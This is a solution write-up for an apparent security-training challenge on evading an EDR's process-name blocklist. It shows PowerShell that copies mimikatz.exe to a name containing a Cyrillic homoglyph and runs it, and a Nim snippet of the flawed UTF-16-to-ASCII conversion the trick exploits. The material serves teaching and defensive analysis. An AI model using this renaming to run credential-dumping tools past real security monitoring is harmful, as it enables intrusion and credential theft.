---
title: "Solution 18: Unicode Process Names"
difficulty: hard
category: "Execution Evasion"
---

[Back to Challenge]({{ '/challenges/18-unicode-names/' | relative_url }})

## Overview

The EDR converts UTF-16 process names to ASCII by replacing non-ASCII characters with `?`. Unicode homoglyphs (characters that look identical but have different code points) break pattern matching.

## Solution

```powershell
# Use Cyrillic homoglyphs that look like Latin characters:
# Latin 'a' = U+0061, Cyrillic 'a' = U+0430
# Latin 'o' = U+006F, Cyrillic 'o' = U+043E
# Latin 'e' = U+0065, Cyrillic 'e' = U+0435

# Rename using homoglyphs (replace 'a' with Cyrillic 'a'):
# mimikatz.exe -> mimik<U+0430>tz.exe
# The EDR sees: mimik?tz.exe (non-ASCII converted to '?')
# Blacklist has: mimikatz.exe
# No match!

# In PowerShell:
$name = "mimik" + [char]0x0430 + "tz.exe"  # Cyrillic 'a'
Copy-Item mimikatz.exe $name
& ".\$name"
```

## Why It Works

```nim
proc wcharToStr(arr: openArray[WCHAR]): string =
  for c in arr:
    if int(c) < 128:
      result.add(chr(int(c)))
    else:
      result.add('?')  # Cyrillic 'a' (U+0430) becomes '?'
```

The Cyrillic 'a' (U+0430) has code point 1072 (> 127), so it becomes `?`. The resulting string `mimik?tz.exe` does not match `mimikatz.exe`.

## Real-World Relevance

This is a known technique used by malware authors. Real EDR products either handle Unicode properly or normalize strings before comparison. The IDN (Internationalized Domain Names) homograph attack is a related web security issue.
